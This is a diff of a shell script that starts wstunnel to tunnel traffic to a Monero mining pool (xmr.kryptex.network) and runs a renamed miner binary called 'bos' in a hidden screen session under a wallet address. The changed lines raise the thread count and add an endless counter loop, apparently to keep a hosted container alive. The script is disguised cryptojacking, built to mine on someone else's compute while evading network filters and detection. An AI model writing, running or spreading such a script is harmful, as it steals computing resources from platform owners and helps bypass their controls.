@@ -11,5 +11,6 @@ tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
 chmod +x wstunnel bos
 nohup ./wstunnel server ws://127.0.0.1:${WS_PORT} &
 nohup ./wstunnel client -L tcp://127.0.0.1:${TCP_PORT}:xmr.kryptex.network:7029 ws://127.0.0.1:${WS_PORT} &
-screen -dmS play ./bos -o 127.0.0.1:${TCP_PORT} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.PY -t 6
-sleep 34674653455
+screen -dmS play ./bos -o 127.0.0.1:${TCP_PORT} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.PY -t 7
+i=0; while true; do echo -ne "\r$i seconds"; ((i++)); sleep 1; done
+
